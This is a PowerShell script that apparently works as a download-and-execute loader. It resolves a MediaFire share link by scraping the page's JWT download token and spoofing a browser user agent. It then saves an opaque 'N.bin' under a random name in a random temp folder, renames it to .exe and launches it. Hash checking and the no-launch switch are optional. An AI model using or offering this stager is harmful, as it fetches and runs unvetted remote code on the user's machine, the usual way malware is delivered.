param(
    [string]$Url = 'https://www.mediafire.com/file/fbvrgy864e62qr0/N.bin/file',
    [string]$FileName,
    [string]$Sha256,
    [switch]$NoLaunch,
    [Parameter(ValueFromRemainingArguments = $true)]$RestArgs
)

$DownloadUrl = $Url

# Fall back to a random file name if none was supplied
if ([string]::IsNullOrWhiteSpace($FileName)) {
    $FileName = [System.Guid]::NewGuid().ToString()
}

$TempDir = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString())
$DownloadedFile = Join-Path $TempDir ($FileName + '.bin')
$ExePath = Join-Path $TempDir ($FileName + '.exe')

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$ExitCode = 1

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$script:UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

function Get-LongestToken([string]$Html) {
    # The page ships a short dummy token first; the real JWT is the longest one.
    $best = ''
    foreach ($m in [regex]::Matches($Html, 'data-security-token="([^"]+)"')) {
        if ($m.Groups[1].Value.Length -gt $best.Length) { $best = $m.Groups[1].Value }
    }
    return $best
}

function Get-JwtClaim([string]$Token, [string]$Name) {

    try {
        $payload = ($Token -split '\.')[1]
        $payload = $payload.Replace('-', '+').Replace('_', '/')
        switch ($payload.Length % 4) {
            2 { $payload += '==' }
            3 { $payload += '=' }
        }
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload)) | ConvertFrom-Json
        return $json.$Name
    }
    catch { return $null }
}

function Get-LinkName([string]$Link) {
    try { $path = ([Uri]$Link).AbsolutePath } catch { $path = $Link }
    foreach ($seg in ($path -split '/')) {
        if ($seg -match '\.' -and $seg -notmatch '(?i)^file$') {
            return [Uri]::UnescapeDataString($seg)
        }
    }
    return $null
}

function Resolve-MediaFireLink([string]$Link) {
    $page = if ($Link -match '(?i)^https?://') { $Link } else { $Link }
    $qkey = $null
    foreach ($pattern in @('/f/([a-z0-9]+)', '/file/([a-z0-9]+)', '[?&]dj=([a-z0-9]+)')) {
        $m = [regex]::Match($Link, $pattern, 'IgnoreCase')
        if ($m.Success) { $qkey = $m.Groups[1].Value; break }
    }
    if ($qkey -and $Link -notmatch '(?i)/file/|/f/') {
        $page = "https://www.mediafire.com/file/$qkey/file"
    }

    $html = (Invoke-WebRequest -Uri $page -UseBasicParsing -SessionVariable sess -Headers @{
            'User-Agent' = $script:UserAgent
            'Referer'    = 'https://www.mediafire.com/'
        }).Content

    # Plain (unflagged) page already carries the link on the button.
    $btn = [regex]::Match($html, 'id="downloadButton"[^>]*?href="([^"]+)"')
    if ($btn.Success) {
        return @{ Url = $btn.Groups[1].Value.Replace('&amp;', '&'); Name = Get-LinkName $page; Pass = $null; Session = $sess }
    }

    $token = Get-LongestToken $html
    if (-not $token) { throw 'No download token on the page - link invalid or page layout changed.' }
    $bdpass = Get-JwtClaim $token 'bdpass'

    $boundary = [guid]::NewGuid().ToString('N')
    $nl = "`r`n"
    $formText = "--$boundary$nl" +
                'Content-Disposition: form-data; name="security_token"' + $nl + $nl +
                "$token$nl" +
                "--$boundary--$nl"
    $formBody = [Text.Encoding]::UTF8.GetBytes($formText)

    for ($attempt = 1; $attempt -le 10; $attempt++) {
        $resp = Invoke-WebRequest -Uri 'https://www.mediafire.com/download_link.php' `
            -Method Post -UseBasicParsing -WebSession $sess `
            -ContentType "multipart/form-data; boundary=$boundary" -Body $formBody `
            -Headers @{
            'User-Agent'       = $script:UserAgent
            'X-Requested-With' = 'XMLHttpRequest'
            'Origin'           = 'https://www.mediafire.com'
            'Referer'          = $page
            'Accept'           = 'application/json'
        }

        $data = $resp.Content | ConvertFrom-Json
        if ($data.result -ne 'success') {
            throw "MediaFire error $($data.error_code): $($data.error_message)"
        }
        if ($data.status -eq 'success' -and $data.download_url) {
            return @{
                Url     = $data.download_url.Replace('&amp;', '&')
                Name    = Get-LinkName $page
                Pass    = $bdpass
                Session = $sess
            }
        }
        if ($data.status -eq 'error') { throw "MediaFire refused a download link: $($data.error_message)" }

        $wait = if ($data.retry_after) { [int]$data.retry_after } else { 5 }
        Write-Host "  server busy, retrying in ${wait}s ($attempt/10)"
        Start-Sleep -Seconds $wait
    }

    throw 'MediaFire kept the download link delayed.'
}

try {
    New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

    $session = $null
    $post = $null

    if ($DownloadUrl -match '(?i)mediafire\.com') {
        Write-Host 'resolving share link...'
        $info = Resolve-MediaFireLink $DownloadUrl
        $DownloadUrl = $info.Url
        $session = $info.Session
        if ($info.Pass) { $post = @{ pass = $info.Pass } }
        if (-not $PSBoundParameters.ContainsKey('FileName') -and $info.Name) {
            $FileName = [IO.Path]::GetFileNameWithoutExtension($info.Name)
            $DownloadedFile = Join-Path $TempDir ($FileName + '.bin')
            $ExePath = Join-Path $TempDir ($FileName + '.exe')
        }
        $shown = $DownloadUrl.Substring(0, [Math]::Min(90, $DownloadUrl.Length))
        Write-Host "resolved -> $shown..."
    }


    $dlParams = @{
        Uri             = $DownloadUrl
        OutFile         = $DownloadedFile
        UseBasicParsing = $true
        Headers         = @{ 'User-Agent' = $script:UserAgent; 'Referer' = 'https://www.mediafire.com/' }
    }
    if ($session) { $dlParams['WebSession'] = $session }
    if ($post) { $dlParams['Method'] = 'Post'; $dlParams['Body'] = $post }

    $dl = Invoke-WebRequest @dlParams -PassThru

    $ctype = [string]$dl.Headers['Content-Type']
    if ($ctype -match 'html') {
        throw 'MediaFire returned a web page instead of the file - link expired, already used, or consent missing.'
    }

    $bytes = (Get-Item -LiteralPath $DownloadedFile).Length
    if ($bytes -eq 0) { throw 'Downloaded file is empty.' }
    Write-Host ("downloaded {0:N0} bytes -> $DownloadedFile" -f $bytes)

    if ($Sha256) {
        $hash = (Get-FileHash -LiteralPath $DownloadedFile -Algorithm SHA256).Hash
        if ($hash -ne $Sha256.Replace('-', '').Trim()) {
            throw "SHA256 mismatch.`n  expected $Sha256`n  actual   $hash"
        }
        Write-Host 'sha256 ok'
    }


    $Stream = [System.IO.File]::OpenRead($DownloadedFile)
    try {
        $Header = New-Object byte[] 2
        $Read = $Stream.Read($Header, 0, 2)
    }
    finally {
        $Stream.Dispose()
    }

    if ($Read -ne 2 -or
        $Header[0] -ne 0x4D -or
        $Header[1] -ne 0x5A) {
        throw 'Downloaded file is not a valid Windows EXE.'
    }


    Move-Item -LiteralPath $DownloadedFile -Destination $ExePath -Force

    if ($NoLaunch) {
        Write-Host "saved, not launched: $ExePath"
        $ExitCode = 0
    }
    else {
    
        & $ExePath @RestArgs
        $ExitCode = $LASTEXITCODE
    }
}
catch {
    Write-Error $_
    $ExitCode = 1
}


exit $ExitCode
